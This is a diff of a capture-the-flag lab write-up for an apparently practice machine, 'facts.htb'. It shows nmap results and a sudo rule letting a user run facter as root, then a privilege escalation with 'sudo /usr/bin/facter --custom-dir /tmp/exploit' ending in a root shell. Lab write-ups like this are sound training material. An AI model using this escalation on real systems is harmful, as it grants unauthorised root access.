@@ -1,4 +1,4 @@
-`
+```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -8,7 +8,8 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: nginx/1.26.3 (Ubuntu)
 |_http-title: Did not follow redirect to http://facts.htb/
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-`
+```
+
 http://facts.htb/
 
 users;
@@ -38,7 +39,7 @@ user to root;
 
 (ALL) NOPASSWD: /usr/bin/facter
 
-`
+```bash
 trivia@facts:~$ sudo -l
 Matching Defaults entries for trivia on facts:
     env_reset, mail_badpass,
@@ -53,6 +54,4 @@ trivia@facts:~$ sudo /usr/bin/facter --custom-dir /tmp/exploit
 root@facts:/home/trivia# cd
 root@facts:~# id
 uid=0(root) gid=0(root) groups=0(root)
-
-
-`
+```
